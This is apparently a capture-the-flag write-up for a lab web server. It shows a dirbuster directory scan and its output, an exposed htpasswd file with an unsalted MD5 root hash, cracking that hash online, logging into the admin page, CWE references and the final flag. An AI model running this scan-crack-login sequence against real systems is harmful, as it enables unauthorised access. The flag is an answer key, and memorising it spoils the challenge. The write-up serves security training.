# htpasswd read file

htpasswd allows you to create and maintain text files where usernames and passwords are stored for basic authentication of HTTP users.

```bash
docker run --rm hypnza/dirbuster -u http://10.11.248.36:80/

Dir found: /images/ - 200
Dir found: / - 200
Dir found: /Images/ - 200
Dir found: /admin/ - 200
Dir found: /audio/ - 200
Dir found: /js/ - 200
File found: /index.php - 200
File found: /js/init.js - 200
Dir found: /css/ - 200
Dir found: /includes/ - 200
File found: /js/skel-layers.min.js - 200
File found: /js/skel.min.js - 200
Dir found: /js/ - 200
Dir found: /fonts/ - 200
File found: /js/jquery.min.js - 200
Dir found: /IMAGES/ - 200
Dir found: /errors/ - 200
Dir found: /JS/ - 200
Dir found: /css/images/ - 200
Dir found: /whatever/ - 200
```

`http://10.11.248.36/whatever/`

On file **htpasswd**:
`root:437394baff5aa33daa618be47b75cb49`
- Cracking password with CrackStation: https://crackstation.net/
`437394baff5aa33daa618be47b75cb49 = qwerty123@`

Use login **root**/**qwerty123@** on admin path: `http://10.11.248.36/admin/#`

## CWE

**CWE-327**: Use of a Broken or Risky Cryptographic Algorithm 
- https://cwe.mitre.org/data/definitions/327.html

**CWE-326**: Inadequate Encryption Strength
- https://cwe.mitre.org/data/definitions/326.html

**Flag**: `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`